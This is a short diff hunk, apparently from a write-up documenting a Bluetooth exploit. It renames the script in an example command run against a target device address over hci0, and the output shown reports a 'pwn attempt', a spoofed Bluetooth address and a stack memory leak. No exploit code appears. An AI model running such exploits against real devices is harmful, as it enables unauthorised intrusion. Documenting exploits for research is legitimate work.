@@ -2428,7 +2428,7 @@ Execution:
 
 ```
 
-python exp.py hci0 84:55:A5:B6:6F:F6 
+python exp4.py hci0 84:55:A5:B6:6F:F6 
 [*] Pwn attempt 0:
 [*] Set hci0 to new rand BDADDR da:f7:c7:a6:25:5f
 [◤] Doing stack memeory leak...
